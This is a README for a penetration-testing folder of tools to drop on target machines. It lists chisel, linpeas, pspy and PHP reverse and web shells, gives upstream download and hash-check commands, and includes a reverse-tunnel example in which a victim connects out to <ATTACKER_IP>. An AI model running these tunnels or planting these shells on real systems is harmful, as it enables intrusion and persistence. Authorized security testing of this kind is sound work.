# Server Uploads

Helper binaries to drop on a target during authorized engagements.

## Inventory

| File | Purpose | Upstream | Version |
| --- | --- | --- | --- |
| chisel | TCP/UDP tunnel over HTTP/WebSocket | https://github.com/jpillora/chisel | 1.11.5 |
| linpeas.sh | Linux privilege escalation enumeration | https://github.com/peass-ng/PEASS-ng | rolling — `peass-ng/PEASS-ng latest` at update time |
| pspy64 | Process snooping without root | https://github.com/DominicBreuker/pspy | v1.2.1 |
| revshell.php | PHP reverse shell (drop-in) | local | — |
| web_shell.php | PHP web shell (drop-in) | local | — |

## Integrity

Verify against `SHA256SUMS`:

```bash
sha256sum -c SHA256SUMS
```

`.previous-versions.txt` stores the SHA256 of the prior bundled versions for forensic comparison.

## Updating binaries

```bash
# chisel (replace <version> with current upstream release tag)
curl -fsSL -o chisel.gz https://github.com/jpillora/chisel/releases/latest/download/chisel_<version>_linux_amd64.gz
gunzip chisel.gz && chmod +x chisel

# linpeas
curl -fsSL -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh

# pspy
curl -fsSL -L -o pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64

# regenerate hashes
sha256sum chisel linpeas.sh pspy64 revshell.php web_shell.php > SHA256SUMS
```

For chisel specifically, the upstream publishes a `chisel_<version>_checksums.txt` per release; cross-check the downloaded `.gz` against that file before gunzip:

```bash
curl -fsSL https://github.com/jpillora/chisel/releases/download/v<version>/chisel_<version>_checksums.txt | grep linux_amd64.gz
sha256sum chisel.gz
```

## Usage examples

### chisel reverse tunnel

```bash
# attacker
./chisel server -p 8080 --reverse

# victim
./chisel client <ATTACKER_IP>:8080 R:1080:socks
```

See [../cheatsheets/chisel.md](../cheatsheets/chisel.md) for a full reference.

### linpeas

```bash
./linpeas.sh -a | tee /tmp/linpeas.log
```

### pspy64

```bash
./pspy64 -pf -i 1000
```

## Windows helpers

Windows-side helper binaries (winPEAS, Seatbelt, Rubeus, SharpHound, mimikatz, nc.exe, etc.) are documented in [./windows/README.md](./windows/README.md) but **not bundled** in this repo — AV/EDR triggers on extraction and GitHub flag-as-malware risk make in-repo distribution impractical. The README documents upstream URLs and an operator workflow for fetching them per engagement.

## Authorized testing only.
